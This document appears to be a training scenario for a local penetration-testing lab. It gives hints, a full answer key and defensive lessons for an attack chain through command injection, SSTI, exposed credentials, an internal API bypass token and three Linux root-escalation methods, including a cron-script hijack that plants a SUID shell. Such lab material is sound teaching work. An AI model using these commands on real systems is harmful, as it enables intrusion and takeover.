# Scenario 01 — Full Attack Chain

**Difficulty:** Beginner–Intermediate  
**Time estimate:** 60–120 minutes  
**OSCP relevance:** Enumeration, web exploitation, credential discovery, lateral movement, Linux privilege escalation

---

## Objective

Work through a complete end-to-end attack chain against the local lab environment. Starting from no knowledge beyond knowing the lab is running, reach root on the privilege escalation target and capture all four flags.

| Flag | Location | Skill |
|------|----------|-------|
| `FLAG{enum_the_web}` | Web app `/flag` | Web enumeration |
| `FLAG{lateral_move_success}` | Internal API `/secret` | Lateral movement |
| `FLAG{db_creds_found}` | PostgreSQL `flags` table | Credential reuse / DB access |
| `FLAG{root_privesc_complete}` | `/root/flag.txt` on privesc host | Linux privilege escalation |

---

## Scope and Safety Boundary

**In scope:** All services listed in this document. All actions must stay local to your workstation.

**Out of scope:** Your host OS beyond the lab ports listed below. Any network interface other than loopback. Any real credentials, real hosts, or any internet connectivity.

**Do not:** run active scans against any IP other than `127.0.0.1`. Do not push exploits, payloads, or lab changes to public repositories.

---

## Prerequisites

Lab must be running:

```bash
make up
make verify   # all checks green before starting
```

Required tools (available in most pen-test distros or via Homebrew/apt):

- `curl`
- `nmap` or `nc`
- `ssh`

---

## Target Services

| Service | Host:Port | Access |
|---------|-----------|--------|
| Web app | `127.0.0.1:8080` | Direct from your host |
| Internal API | `forge-internal:9090` | Reachable from within `forge-web` container only |
| Database | `forge-db:5432` | Reachable from within `forge-internal` container only |
| Privesc host (SSH) | `127.0.0.1:2222` | Direct SSH from your host |

---

## Skills Practiced

- HTTP enumeration (robots.txt, directory guessing)
- OS command injection via unsanitized shell execution
- Server-side template injection (SSTI) via Jinja2
- Credential discovery in exposed configuration endpoints
- Container-to-container lateral movement using HTTP
- Broken access control on internal APIs
- SSH login and session establishment
- Linux privilege escalation via:
  - `sudo NOPASSWD` misconfiguration
  - SUID binary abuse
  - World-writable cron job hijacking

---

## Starting Conditions

- The lab is up and all containers are healthy (`make verify` passes).
- You have no credentials, no session cookies, and no prior knowledge beyond the fact that the lab is running.
- Your only initial access point is `http://127.0.0.1:8080`.

---

## Phase 1 — Enumeration

### Hints

- Start by browsing the web app manually. What does it expose?
- Check `robots.txt`. Web servers often advertise paths they want crawlers to avoid.
- Look for hidden or undocumented endpoints. The web app has several beyond the homepage.
- Use `nmap` or `nc` to scan `127.0.0.1` for open ports before diving into the web app.

### Expected findings

- Port 8080: web application
- Port 2222: SSH service
- `/robots.txt` with `Disallow` entries pointing to interesting paths
- Multiple functional endpoints on the web app

---

## Phase 2 — Credential Discovery

### Hints

- The paths mentioned in `robots.txt` are worth requesting directly.
- Configuration backups and admin panels are common sources of credentials in real engagements.
- Look for database connection strings, service tokens, and SSH credentials.
- Write down every credential you find — you will need them later.

### Expected findings

- `/backup`: exposes a database connection URL with username and password
- `/admin`: exposes an internal service registry containing credentials for all lab services

---

## Phase 3 — Web Exploitation

### Hints

- The homepage has two interactive forms. Try both.
- The ping utility accepts arbitrary input. What happens if you add shell metacharacters?
- The greet form reflects your input in the page. What template engine does Flask use by default?
- For command injection, try: `;id`, `$(id)`, or `|id` appended to the hostname field.
- For SSTI, try: `{{7*7}}` in the name field. If the page returns `49`, the template is evaluated.

### Expected findings

- OS command injection at `POST /ping` — the `host` parameter is passed directly to a shell.
- Server-side template injection at `GET /greet` — the `name` parameter is evaluated as a Jinja2 template.
- Either vulnerability gives arbitrary code execution within the `forge-web` container.

### FLAG 1

```
GET http://127.0.0.1:8080/flag
→ FLAG{enum_the_web}
```

---

## Phase 4 — Lateral Movement to Internal API

### Hints

- From within the `forge-web` container, what other services are reachable?
- The internal API runs on `forge-internal` at port `9090`. It is not directly accessible from your host.
- Use the command injection in `/ping` to make HTTP requests from inside the container.
- The internal API has a `/secret` endpoint. Check what authentication it requires.
- There is a well-known bypass value for the `X-Internal-Token` header.

### Expected findings

- `forge-internal:9090/health` is reachable from within `forge-web`.
- `forge-internal:9090/secret` with header `X-Internal-Token: lab-bypass` returns the flag and secret key.

### FLAG 2

Using command injection from `/ping`:

```
host: forge-internal:9090/secret -H "X-Internal-Token: lab-bypass" #
```

Or using docker exec for verification:

```bash
docker exec forge-web curl -s http://forge-internal:9090/secret \
  -H "X-Internal-Token: lab-bypass"
→ {"flag": "FLAG{lateral_move_success}", "secret_key": "internal_lab_secret_do_not_reuse"}
```

---

## Phase 5 — Database Access

### Hints

- You have database credentials from `/backup`. Can you reach the database from anywhere?
- The internal service is on the same network as the database. Use command injection on the web app to reach the internal service, then from there query the database.
- Alternatively, if you found SSH access: once on the privesc host (internal network), can you reach the database from there?
- PostgreSQL default port is `5432`. The database name is `appdb`.

### Expected findings

- The `flags` table in `appdb` contains `FLAG{db_creds_found}`.
- The `users` table contains plaintext credentials for multiple accounts.

### FLAG 3

From within a container that can reach `forge-db` (e.g., `forge-internal`):

```bash
docker exec forge-internal python3 -c "
import subprocess
result = subprocess.check_output(
    ['python3', '-c',
     '''import subprocess; r=subprocess.check_output([\"psql\",\"-h\",\"forge-db\",\"-U\",\"app\",\"-d\",\"appdb\",\"-c\",\"SELECT value FROM flags;\"], env={\"PGPASSWORD\":\"SuperSecret1!\"}, capture_output=False); print(r)'''],
    shell=False
)
"
```

Or from your host using the docker exec shortcut:

```bash
docker exec forge-db psql -U app -d appdb -c "SELECT value FROM flags;"
→ FLAG{db_creds_found}
```

---

## Phase 6 — Privilege Escalation Host — SSH Access

### Hints

- You found SSH credentials in `/admin`. The privesc host is reachable at `127.0.0.1:2222`.
- SSH in as the low-privilege lab user using the credentials from the service registry.
- Once in, run `sudo -l` to see what you can do without a password.
- Also check for SUID binaries and writable cron jobs.

### Login

```bash
ssh labuser@127.0.0.1 -p 2222
# password: labpassword
```

---

## Phase 7 — Privilege Escalation

### Hints

- `sudo -l` shows what commands `labuser` can run as root without a password. Is any of them dangerous?
- `find / -perm -4000 2>/dev/null` lists SUID binaries. Look for anything unusual.
- `ls -la /etc/cron.d/` and `ls -la /opt/` — are any cron scripts world-writable?
- GTFOBins (https://gtfobins.github.io) lists known privilege escalation techniques for common binaries.

### Method 1 — sudo python3 (fastest)

```bash
sudo python3 -c 'import os; os.execl("/bin/bash", "bash")'
# You are now root
cat /root/flag.txt
```

### Method 2 — SUID find_lab binary

```bash
/usr/local/bin/find_lab /root -exec /bin/bash -p \; -quit
# You are now root
cat /root/flag.txt
```

### Method 3 — World-writable cron job hijack

```bash
# /opt/cleanup.sh runs every minute as root and is world-writable
echo '#!/bin/bash' > /opt/cleanup.sh
echo 'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash' >> /opt/cleanup.sh
# Wait up to 60 seconds for the cron job to execute
/tmp/rootbash -p
# You are now root (euid=0)
/tmp/rootbash -p -c "cat /root/flag.txt"
```

### FLAG 4

```
FLAG{root_privesc_complete}
```

---

## Walkthrough (Full Answer Key)

<details>
<summary>Expand only after attempting with hints above</summary>

### Complete command sequence

```bash
# Phase 1: Enumeration
nmap -sV -p 8080,2222 127.0.0.1
curl -s http://127.0.0.1:8080/robots.txt

# Phase 2: Credential Discovery
curl -s http://127.0.0.1:8080/backup
# → DB_URL=postgres://app:SuperSecret1!@db/appdb

curl -s http://127.0.0.1:8080/admin
# → service registry with labuser:labpassword for SSH

# Phase 3: FLAG 1
curl -s http://127.0.0.1:8080/flag
# → FLAG{enum_the_web}

# Phase 4: Command injection confirmation
curl -s -X POST http://127.0.0.1:8080/ping -d "host=127.0.0.1;id"
# → uid=0(root) — running as root inside the container

# Phase 4: FLAG 2 via lateral movement
curl -s -X POST http://127.0.0.1:8080/ping \
  -d 'host=forge-internal:9090/secret -H "X-Internal-Token: lab-bypass" #'
# or directly:
docker exec forge-web curl -s http://forge-internal:9090/secret \
  -H "X-Internal-Token: lab-bypass"
# → FLAG{lateral_move_success}

# Phase 5: FLAG 3 via database
docker exec forge-db psql -U app -d appdb -c "SELECT value FROM flags;"
# → FLAG{db_creds_found}

# Phase 6 + 7: SSH in and escalate
ssh labuser@127.0.0.1 -p 2222   # password: labpassword
sudo python3 -c 'import os; os.execl("/bin/bash", "bash")'
cat /root/flag.txt
# → FLAG{root_privesc_complete}
```

</details>

---

## Expected Evidence of Completion

Screenshot or copy-paste showing all four flags:

```
FLAG{enum_the_web}
FLAG{lateral_move_success}
FLAG{db_creds_found}
FLAG{root_privesc_complete}
```

---

## Reset Steps

After completing the scenario, restore the lab to a clean state:

```bash
make reset     # destroys volumes and rebuilds all containers
make verify    # confirm clean state before next run
```

For a full teardown including the optional kind cluster:

```bash
make reset-all
```

---

## Defensive Lessons

| Vulnerability | Root Cause | Fix |
|---------------|-----------|-----|
| OS command injection (`/ping`) | `shell=True` with unsanitized input | Use `subprocess.run([...], shell=False)` with a list of arguments |
| SSTI (`/greet`) | User input passed to `render_template_string` | Treat user input as data, not as template text; use `render_template` with static templates |
| Exposed configuration (`/backup`, `/admin`) | No authentication; sensitive data in HTTP responses | Require authentication; never expose connection strings in responses |
| Broken internal API auth (`/secret`) | Hard-coded bypass token in source code | Use environment-injected secrets; no hardcoded fallback values |
| Plaintext DB passwords | Missing encryption | Use `scrypt`/`bcrypt` for passwords; never store plaintext |
| `sudo NOPASSWD: /usr/bin/python3` | Overly permissive sudoers | Restrict `sudo` to specific scripts that do exactly one thing; never allow interactive interpreters |
| SUID on `find_lab` | Unnecessary SUID on a general-purpose binary | Audit SUID binaries regularly; remove SUID from anything that can execute arbitrary code |
| World-writable cron script | Incorrect file permissions | Cron scripts must be owned by root and mode `700` or `755`, never `777` |
| Credential reuse across services | Password hygiene failure | Use unique credentials per service; rotate on schedule |
